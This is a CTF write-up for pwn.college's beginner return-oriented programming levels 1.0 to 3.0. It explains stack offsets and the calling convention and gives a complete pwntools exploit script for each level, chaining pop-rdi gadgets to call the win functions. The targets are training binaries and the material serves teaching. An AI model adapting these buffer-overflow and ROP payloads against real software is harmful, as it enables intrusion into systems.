---
title: Return Oriented Programming
description: ROP is not just a hack; it’s a masterpiece of unauthorized orchestration, a ballet of borrowed instructions, choreographed with precision to achieve your clandestine objectives. With ROP, you step into a realm where every byte is a beat, and every return is a rhythm, embarking on an exhilarating journey of exploitation and discovery.
author: 5o1z
date: 2024-12-2 10:18 +0700
categories: [Practice, Pwn College]
tags: [pwn, pwntools]
image:
  path: /assets/img/Assembly-Crash-Course/Assembly_Language.png
---

## Level 1.0

### Description
> Overwrite a return address to trigger a win function!
### Analysis
```sh
This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x401a59.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffed36def98, 40 bytes after the start of your input buffer.
That means that you will need to input at least 48 bytes (28 to fill the buffer,
12 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```
So like the description we need to overwrite the return address that make RIP point to win function address to execute it.
Since this is the first challenge it will a little bit easy cuz we have all the information and we just need to write the exploit
### Exploit
```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/./babyrop_level1.0', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

pl = b'A'*40
pl += p64(exe.sym['win']) # win address = 0x401a59

sl(pl)


p.interactive()
```

## Level 2.0

### Description
> Use ROP to trigger a two-stage win function!
### Analysis

```sh
In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
In order to get the flag, you will need to call all of these stages in order.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffe6dcf3598, 104 bytes after the start of your input buffer.
That means that you will need to input at least 112 bytes (78 to fill the buffer,
26 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```
So in this challenge the exploit we need to write be able to call `win_stage_1` and `win_stage_2` together
Remind **`Calling convention`**, when the function is called it will save the return address on the stack so with that idea, when we control RIP and make it executed `win_stage_1` function, we need to include the return address of `win_stage_2` function in our payload. So with that when the function is finished and reach `ret` instruction now the RIP will point to the top of the stack with now is the return address of `win_stage_2` function

And the chain will look like this: challenge function --> ret --> win_stage_1 --> ret --> win_stage_2

### Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/./babyrop_level2.0', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

pl = b'A'*104
pl += p64(exe.sym['win_stage_1'])
pl += p64(exe.sym['win_stage_2'])

sl(pl)
p.interactive()
```
## Level 3.0

### Description
> Use ROP to trigger a multi-stage win function!

### Analysis

```sh
In this challenge, there are 5 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_5`.
In order to get the flag, you will need to call all of these stages in order.

In addition to calling each function in the right order, you must also pass an argument to each of them! The argument
you pass will be the stage number. For instance, `win_stage_1(1)`.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffc6d07d638, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (104 to fill the buffer,
16 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

So this challenge is a little bit harder than above, we need to inject the argument before we call that function
So let's check a bit with IDA:

```c
int __fastcall win_stage_1(int a1)
{
  char buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 1 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 0LL, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```
As we can see in the pseudo-code above, what we need to do is bypass this condition:
```c
  if ( a1 != 1 )
    return puts("Error: Incorrect value!");
```

To do that we'll use ROPchains, which can help us control RDI, RSI, RDX, RCX, R8 and R9 registers which are used to save the value of the arguments for the function

We can find what we need by using ROPchain tool. So the thing that we need here is passing argument 1 to the function so we can do:
```sh
➜  ROP ROPgadget --binary babyrop_level3.0 | grep "pop rdi"
0x0000000000402a93 : pop rdi ; ret
```

**Note: I use `scp` command to get the challenge file so I can easily analyze that file**
With that information and combined with the pseudo-code that IDA give us we can easily write exploit script

### Exploit
```py
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./babyrop_level3.0', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x0000000000402973
c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

pop_rdi = 0x0000000000402a93

pl = b'A'*120
pl += p64(pop_rdi) + p64(0x1) + p64(exe.sym['win_stage_1'])
pl += p64(pop_rdi) + p64(0x2) + p64(exe.sym['win_stage_2'])
pl += p64(pop_rdi) + p64(0x3) + p64(exe.sym['win_stage_3'])
pl += p64(pop_rdi) + p64(0x4) + p64(exe.sym['win_stage_4'])
pl += p64(pop_rdi) + p64(0x5) + p64(exe.sym['win_stage_5'])

sl(pl)


p.interactive()
```
